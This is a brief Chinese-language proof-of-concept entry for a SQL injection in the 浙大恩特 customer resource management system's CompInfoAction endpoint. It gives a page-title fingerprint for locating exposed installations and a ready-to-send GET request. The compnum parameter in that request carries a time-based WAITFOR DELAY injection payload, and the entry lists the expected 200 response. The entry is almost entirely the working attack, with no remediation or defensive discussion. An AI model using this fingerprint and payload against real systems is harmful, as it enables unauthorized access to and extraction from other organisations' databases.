# 浙大恩特CompInfoAction存在SQL注入

浙大恩特 ｜ SQL注入 ｜ —
- **指纹**：`title="欢迎使用浙大恩特客户资源管理系统"`
- **请求**：`GET /entsoft/CompInfoAction.emrser;.js?compnum=1%27%3BWAITFOR+DELAY+%270%3A0%3A3%27--&method=selectCompBank HTTP/1.1`
- **响应特征**：200